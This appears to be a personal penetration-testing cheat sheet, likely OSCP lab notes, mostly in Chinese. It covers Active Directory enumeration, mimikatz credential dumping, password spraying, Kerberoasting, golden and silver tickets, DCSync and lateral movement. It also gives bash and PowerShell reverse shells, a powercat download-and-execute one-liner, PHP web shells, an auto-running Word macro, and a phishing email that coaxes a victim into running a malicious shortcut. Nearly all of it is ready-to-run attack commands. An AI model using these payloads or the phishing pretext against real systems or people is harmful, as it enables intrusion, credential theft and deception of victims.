		/usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/powerview.ps1
		### sid转名称
			Convert-SidToName xxxx
		### 获取域的基本信息
			get-netdoamin
		### 枚举对象上的所有属性 + 筛选cn 域用户 域用户组
			get-netuser ｜ select cn,pwdlastset,lastlogon
			get-netgroup | select cn
		### 筛选属性
			Get-netgroup "Sales Department" | select member
		------- 
		## 枚举操作系统
		### 所有计算机对象 机器名
			get-netcomputer 
			get-netcomputer |select cn,distinguishedname
			## 根据某个属性的值筛选
			get-netcomputer |  Where-Object {$_.cn -like 'files04'}
			
		### 当前帐号在其他机器上有管理员权限主机
			Find-LocalAdminAccess
		------- 
		## 已登录账户
		### 目标主机上有哪些用户登录 依赖于注册表              HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\，很大几率会查询失败。
			Get-NetSession -ComputerName files04 -Verbose
			### 查看权限
				Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
				
		### 目标主机上有哪些用户登录  必须开启Remote Registry服务
			.\PsLoggedon.exe \\files04
		------- 
		## 使用spn枚举
		### spn枚举用户和特定服务
			Get-NetUser -SPN | select samaccountname,serviceprincipalname
			或：setspn -L iis_service
			nslookup.exe web04.corp.com 
		------- 
		## 枚举对象权限
		### 对象的ACEs枚举 关注ActiveDirectoryRights，SecurityIdentifier 
			Get-ObjectAcl -Identity stephanie
		### sid转名字
			Convert-SidToName xxx
		### 查找特定组内的ActiveDirectoryRights为GenericAll权限的用户的sid
			Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
		------- 
		## 枚举域共享
			### SYSVOL默认映射到dc的 \\dc1.corp.com\sysvol\corp.com\
			Find-DomainShare
			### 默认共享查询 也可以用非默认共享查询的格式
			ls \\dc1.corp.com\sysvol\corp.com\
			cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
			### 非默认共享查询 
			ls \\FILES04\docshare
			
------
## 自动 SharpHound BloodHound   /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1
	Import-Module .\Sharphound.ps1
	Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp -OutputPrefix "medtech"
	kali> neo4j start 
		  bloodhound
			MATCH (m:Computer) RETURN m 
			MATCH (m:User) RETURN m
			### 用户在哪些主机有session
			MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
			### 枚举winrm user
			MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
			### 枚举sql权限
			MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2




```
### Active Directory身份验证和攻击
mimikatz mimikatz..exe
```powershell
## mimikatz
	### 快捷
		.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonPasswords full" "exit"
		.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::lsa /patch" "exit"
	### powershell注入内存
		/usr/share/ad/Tools/PSTools/Invoke-ReflectivePEInjection.ps1
	
	### 直接转储Lsass
		条件：需要SEDebugPrivilege权限，本地管理员默认有此权限
		任务管理器-Lsass-右键-dump fie 
		kali: pypykatz lsa minidump xxx.DMP
			  或crackmapexec smb 192.168.0.76 -u testadmin -p Password123 --lsa  会存到~/.cme/logs/ #破解密码
			  或crackmapexec smb 192.168.0.76 -u testadmin -p Password123 -M lsassy
			  或 新机器上可启用WDigest，但一般情况不需要
		或win: procdump.exe -accepteula -ma "lsass.exe" out.dmp
			   或tasklist | findstr lsass && procdump.exe -accepteula -ma 580 out.dmp
		
	### dump SAM SYSTEM
		impacket-secretsdump -system ./SYSTEM -sam ./SAM LOCAL
## exe use 
	privilege::debug	###开启SeDebugPrivilege访问权限
	token::elevate 		###提升至system权限
	lsadump::sam		###提取SAM中的NTLM哈希
	lsadump::cache         ###和cme的--lsa一样,cme的可以破解
	lsadump::secrets
	lsadump::lsa /patch ###导出krbtgt的NTLM和域SID 和管理和域用户的has
	sekurlsa::logonpasswords  ###尝试从所有可用的来源中提取明文密码和密码哈 > 大量输出
	sekurlsa::tickets   ###TGT TGS 显示存储在内存中的票据
	
	###私钥导出
	crypto::capi        ###CryptoAPI函数
	crypto::cng         ###KeyIso服务
	
	###silver ticket制作 生成白银票据
	kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
	
	###将NTLM hash转成Kerberos ticket
	sekurlsa::pth
	 
	###导出票据 
	sekurlsa::tickets /export
	
	###导出krbtgt的NTLM和域SID
	lsadump::lsa /patch
	
	###删除所有现存的ticket
	kerberos::purge
	
	### 生成黄金票据 用户名要存在
	kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt

```

```powershell
-----------------------------------------------------------
# AD认证介绍
	## NTLM身份验证介绍
		### 客户端通过ip地址而不是主机名 或 对未在ad集成的dns服务器上注册的主机名进行验证时 会使用NTLM
		### 认证过程 比较简单
			![image-20230816151936961](https://cdn.jsdelivr.net/gh/klearcc/pic/img202308161519059.png)
		
	## Kerberos身份验证介绍 [[AD theoretical]] 
		
	## 缓存的AD凭证
		privilege::debug
		mimikatz几个命令
	



-----------------------------------------------------------
# AD认证攻击 ad攻击
	-------- 
			### 已登录账户
			crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
			
	## 域用户枚举 枚举用户名
		1. ### cme枚举域用户
			crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
			nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --rid-brute
		1. ### kerbrute
			kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
		3. ### windapsearch
			python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
				#-da 枚举域管理员组成员
				#-PU 查找特权用户
		4. ### bloodhound 
		1. rpcclient  #前提能连上smb
		
			
	--------
	## AD密码喷洒
		0. ### 有加入域的Windows主机时 不需要提供user字典,不锁账户
		    ps> Import-Module .\DomainPasswordSpray.ps1
		    ps> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
		    Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
		    
		1. ### 使用LDAP和ADSI  不需要提供user字典
			/usr/share/ad/Tools/Spray-Passwords.ps1
			.\Spray-Passwords.ps1 -Pass Mushroom! -Admin #-File 字典
			
 		2. ### SMB 流量大速度慢 net user /domain或get-netuser获取用户
				crackmapexec smb 192.168.50.70-79 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
				
		3. ### smb hash喷洒
			###使用本地认证   
			  crackmapexec smb  172.16.222.82-83  -u administrator -H f1014ac49bae005ee3ece5f47547d185  --local-auth
			###使用域认证
			crackmapexec smb  172.16.222.82-83 -u administrator -H f1014ac49bae005ee3ece5f47547d185
		4. ### winrm
			crackmapexec winrm   172.16.222.82-83 172.16.222.10-14 192.168.222.120-122 -u wario -p Mushroom! --continue-on-success
			evil-winrm -i 172.16.222.83 -u wario -p 'Mushroom!'
			evil-winrm -i 10.10.81.142  -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd
		1. ### 获取TGT 只使用两个UDP帧
			.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
	
	-------- 
	## AS-REPRoasting解密码 条件：不进行Kerberos预身份验证,也就是kerberos前两步
		### 查找开了此选项的用户
			kali> impacket-GetNPUsers -dc-ip 192.168.50.70 corp.com/pete
			或:win> powerview> Get-DomainUser -PreauthNotRequired 
		### 利用 对有密码的账户直接利用，看是否可利用  不删hash
			kali> impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
			hashcat --help | grep -i "Kerberos"  >> AS-REP 18200
			sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
			或win> .\Rubeus.exe asreproast /nowrap
			
	-------- 
	## Kerberoasting SPN解密码  只在用户账户登录的情况下使用这种攻击方式 有可能spn的话(想要的账户在机器上登录) + 有域内任意账户密码
		kali> sudo impacket-GetUserSPNs -request -dc-ip 10.10.99.146 oscp.exam/web_svc
		hashcat --help | grep -i "Kerberos">>TGS-REP 13100不删
		sudo hashcat -m 13100 hashes.kerberoast2  /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
		或:win> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
		
	-------- 
	## 伪造服务票据 Silver Tickets TGS伪造后可以访问特定服务
		### 条件：应用程序并不验证服务票据中的用户和组权限，有对应服务账户（SPN）密码或其关联的NTLM哈希值
		### 创建银票所需
			1 SPN password hash SPN密码哈希
				mimikatz 服务账户的NTLM
			2 Domain SID 域SID，不需要RID
				whoami /user
			3 Target SPN 目标 SPN
				HTTP/web04.corp.com:80
		### mimikatz创建
			mimikatz: kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
			ps> klist
			ps> iwr -UseDefaultCredentials http://web04
			
	--------
	## 域控制器同步 dcsync攻击 结果：可以请求任何用户凭据
		###域控冗余，会有多个互相复制，只验证相关的SID是否具有适当的权限
		###默认 域管理员、企业管理员和管理员组的成员 有这种权限
		###使用dcsync攻击伪装域控，从域中请求任何用户凭据
			##dave是目标用户名 ip为dc的ip 密码要转义
			kali> impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"mima2023\!"@192.168.50.70
			hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
			或win> lsadump::dcsync /user:corp\dave  #dave是目标用户名
			
```
### 横向 持久化

```powershell
## 目标:使用用户的哈希值或Kerberos票据进行身份验证并获得代码执行权限
### Kerberos和NTLM不直接使用明文密码，微软原生工具也不支持使用hash进行身份验证
------------------------------------------------
## 横向
%% 貌似横向内容中 需要本地管理员权限的 好像 是administrator组内的成员都可以 %%
	-------- 
	1### WMI和WinRM  
	条件:有帐号密码+
		#### WMI 需要账户是目标本地管理员组的成员
			ps> ~/桌面/OSCP/smallTools/reverseShell_WMI.txt
		#### winrs只适用于域用户，而且是目标主机上管理员或远程管理用户组的一部分
			ps> winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e xxx"
			或：ps>
			$username = 'jen';
			$password = 'Nexus123!';
			$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
			$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
			New-PSSession -ComputerName 192.168.50.73 -Credential $credential
			Enter-PSSession idNum
	
	------- 
	2### PsExec 
	条件:已有账户是目标本地管理员组的一部分+ADMIN$共享必须可用+文件和打印机共享必须已打开。最后2默认打开   ##默认比wmiexec获取的权限高
		./PsExec64.exe -i  \\web04 -u corp\jen -p Nexus123! cmd
		impacket-psexec -hashes 00000000000000000000000000000000:管理员hash Administrator@120.63.142.48 cmd.exe
		impacket-psexec 'yoshi@172.16.222.82'
		impacket-psexec 'yoshi:Mushroom!@172.16.222.82' 
		impacket-psexec 'relia.com/xxx:pass@192.168.248.189' 
		###有了Kerberos票据可以免帐号密码使用 .\PsExec.exe \\files04 cmd
	
	------- 
	3### Pass The Hash pth. 只适用于NTLM，适用于Active Directory域帐户和内置的本地管理员帐户
	条件:已有hash是目标本地管理员组的一部分+开ADMIN$+开445+启用Windows文件和打印机共享。最后2默认打开
		impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.202.72
	
	-------
	4### Overpass The Hash 利用tgt
	条件:有管理员权限能正常运行mimikatz，有目标账户的hash
		### 获取tgt
			sekurlsa::pth /user:Administrator /domain:corp.com /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell
			 net user /domain
			 klist
			 .\PsExec.exe \\web04 cmd    ##条件见psexec条件

	------- 
	5### Pass The Ticket 利用tgs，可以导出并重新注入，如果服务票据属于当前用户，则不需要管理员权限。
	条件:内存中有想要的tgs
		### 导出票据
			privilege::debug
			sekurlsa::tickets /export
		### 列所有票据 
			dir *.kirbi
		### 导入票据到自己的会话 cifs
			kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
			klist
	
	------- 
	6### DCOM 
	条件:当前账户需要是目标机器的本地管理员组的成员
		####利用 目标ip 
		$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e xxx","7")

------------------------------------------------
## 持久化 Persistence
	------- 
	## 黄金票据  获取到krbtgt密码哈希(secret key)，就能自己创建tgt。伪造后可以获取整域的资源，给低权限发放域管tgt
	条件：域管理员组的成员或dc的权限
		dc>privilege::debug   
		dc>lsadump::lsa /patch   ##导出krbtgt的NTLM和域SID
		###vic上注入票据内存不需要任何admin权限，未加入域的主机也可以
		vic>kerberos::purge 
		vic>kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
		vic>misc::cmd
		vic>PsExec.exe \\dc1 cmd.exe
		
	--------
	## 影子副本 vss vshadow>NTDS.dit>可提取每个用户凭据
	条件：域管权限 缺点：要传vshadow.exe,可以直接在dc上mimikatz
		win> vshadow.exe -nw -p  C:
			Shadow copy device name:
		win> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
		win> reg.exe save hklm\system c:\system.bak
		kali>impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL



```



## 反弹shell..
```powershell
------------
### linux
bash -c "bash -i >& /dev/tcp/192.168.45.249/1234 0>&1"
'bash','-c','bash -i >& /dev/tcp/192.168.45.249/1234 0>&1'

### cli内容>>
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|bash -c 'bash -i >& /dev/tcp/192.168.45.249/1234 0>&1' >/tmp/f" >> /tmp/this_is_fine.sh




------------
### win
用这个只改ip port>  ~/桌面/OSCP/smallTools/reverseShell_powershell.py

或powercat
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.213:1111/powercat.ps1'); powercat -c 192.168.45.213 -p 1234 -e powershell"

'$client = New-Object System.Net.Sockets.TCPClient("192.168.45.212",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

### 反弹shell并编码  在线运行：https://www.w3cschool.cn/tryrun/runcode?lang=powershell
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.248",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText

use > powershell -enc "xxxx"
use > powershell.exe -nop -w hidden -enc "xxx"

## winbase64编码
```bash
$Text = ''
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText

huozhe
~/桌面/OSCP/smallTools/reverseShell_powershell.py
```
## 一句话
```bash

<?php system($_GET[base64_decode('Y21k')]);?>

<?php system($_REQUEST['cmd']); ?>
<?php echo system($_GET['cmd']); ?>

 
<?php system($_GET['cmd']);?>
```

##  钓鱼fish
doc宏
```powershell
###
Sub AutoOpen()
  MyMacro
End Sub
Sub Document_Open()
  MyMacro
End Sub
Sub MyMacro()
  CreateObject("Wscript.Shell").Run "powershell"
End Sub
###

###参数 分割
str = "powershell.exe -nop -w hidden -e xxx"
n = 50
for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')


```
快捷方式
```bash
启webdav
启powercat http
启nc
vi config.Library-ms
制作install.lnk
config作为附件发邮件

## webdav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root   /root/Document/relia

## 脚本内容 config.Library-ms
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.20713</url>   ###修改为kali
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>

## 快捷方式
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.173:1111/powercat.ps1'); powercat -c 192.168.45.173 -p 1234 -e powershell"

## 发邮件 --server是受害mailserver地址
sudo swaks -t jim@relia.com  --from maildmz@relia.com --attach @config.Library-ms --server 192.168.210.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap

## body.txt
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.

On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

damon

```
## 框架
```bash
## wpscan
wpscan --url http://172.16.111.241 --enumerate p --plugins-detection aggressive -o websrv1/wpscan
```
## 数据库

```bash
#mysql
	mysql -u root -p'root' -h 192.168.199.197   -P 3306

#postgres 密码加密方式：Atlassian hashcat：12001
	psql -h 192.168.237.143  -p 1234 -U postgres
		\l              所有数据库
		\c confluence   连接到confluence数据库
		\dt             库里的表
		select * from cwd_user;  搜索是cmd_user表
	hashcat -m 12001  admin.hash  /usr/share/wordlists/fasttrack.txt

```
## Tips
```powershell
## powershell传文件
	kali> wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root   /root/Document/atp 
	ps> Invoke-RestMethod -Uri http://192.168.45.168/Database1.kdbx244/bloodhound.zip -Method PUT -InFile .\Database.kdbxmedtech_20231121055909_BloodHound.zip

## wget 目录
	wget -r -np -nH http://192.168.237.144/.git/
## git  
	git status
	git log 
	git show xxx
## UAC
	1. 加入域的机器可以无视
	2. 非加入域的机器：需要有管理员权限
	3. 

## hash连接rdp问题
	REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
## 域中双跳问题解决
	----------- 
	1. ## evil-winrm中使用
		### 创建cred
		$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
		$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
		### 使用
		get-domainuser -spn -credential $Cred
		
	-----------
	2. ## 有rdp时使用 
	    ### 用winrm连接目标
		Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm
		### 注册新配置
		Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
		Restart-Service WinRM
		### 重连
		Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
```



